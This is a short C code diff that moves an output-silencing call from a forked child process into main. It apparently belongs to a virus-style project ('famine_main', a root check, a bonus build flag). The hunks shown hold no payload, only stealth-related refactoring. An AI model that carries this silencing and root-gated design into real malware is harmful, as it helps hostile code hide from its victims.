@@ -70,9 +70,7 @@ int is_root_user() {
 void famine_main(void *input, int woody_init_ok) {
     pid_t pid = fork();
     if (pid == 0) {
-        if (*get_log_level() == L_NONE) {
-            mute_output();
-        }
+
         int lock_fd = lock_global();
 
         #ifdef FAMINE_BONUS
@@ -94,9 +92,14 @@ void famine_main(void *input, int woody_init_ok) {
 }
 
 int main(int argc, char **argv) {
+    
+    (void)argc, (void)argv;
+    
     set_log_level(L_NONE);
 
-    (void)argc, (void)argv;
+    if (*get_log_level() == L_NONE) {
+        mute_output();
+    }
 
     if (!is_root_user()) {
         return (1);
